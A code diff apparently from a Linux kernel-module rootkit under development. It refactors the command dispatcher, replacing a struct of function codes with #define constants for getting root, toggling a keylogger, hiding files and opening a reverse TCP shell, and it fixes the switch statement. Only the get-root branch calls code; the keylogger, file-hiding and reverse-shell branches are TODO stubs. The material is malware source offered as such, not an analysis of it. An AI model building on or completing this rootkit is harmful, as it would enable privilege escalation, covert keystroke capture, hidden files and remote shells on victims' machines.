@@ -45,24 +45,13 @@ typedef struct timer_list _timer;
 #endif
 
 // TODO: Extract this to an h file to avoid duplication.
-typedef struct function_code {
-    int get_root;
-    int keylogger_enable;
-    int keylogger_disable;
-    int file_hide_add;
-    int file_hide_rm;
-    int file_hide_show;
-    int reverse_tcp_shell;
-} function_code;
-
-function_code functionCode = {
-    .get_root = 0,
-    .keylogger_enable = 1,
-    .keylogger_disable = 2,
-    .file_hide_add = 3,
-    .file_hide_rm = 4,
-    .file_hide_show = 5,
-    .reverse_tcp_shell = 6};
+#define GET_ROOT 0
+#define KEYLOGGER_ENABLE 1
+#define KEYLOGGER_DISABLE 2
+#define FILE_HIDE_ADD 3
+#define FILE_HIDE_RM 4
+#define FILE_HIDE_SHOW 5
+#define REVERSE_TCP_SHELL 6
 
 // This action_task struct is what is actually passed to the LKM.
 typedef struct action_task {
@@ -121,31 +110,31 @@ void log_error(const char *message) {
 int handle_task(action_task *task) {
     printk(KERN_EMERG "Handling function code: %d\n", task->func_code);
     switch (task->func_code) {
-        case functionCode.get_root:
+        case GET_ROOT:
             return get_root();
-        case functionCode.keylogger_enable:
+        case KEYLOGGER_ENABLE:
             // TODO
             break;
-        case functionCode.keylogger_disable:
+        case KEYLOGGER_DISABLE:
             // TODO
             break;
-        case functionCode.file_hide_add:
+        case FILE_HIDE_ADD:
             // TODO
             break;
-        case functionCode.file_hide_rm:
+        case FILE_HIDE_RM:
             // TODO
             break;
-        case functionCode.file_hide_show:
+        case FILE_HIDE_SHOW:
+            // TODO: print contents of hidden_file_prefix array
+            break;
+        case REVERSE_TCP_SHELL:
             // TODO
             break;
-        case functionCode.reverse_tcp_shell:
-
-            // TODO
-            break;
-        case default:
+        default:
             printk(KERN_ERR "Unexpected function code. This shouldn't be possible.\n");
             return -1;
     };
+	return 0;
 }
 
 /**
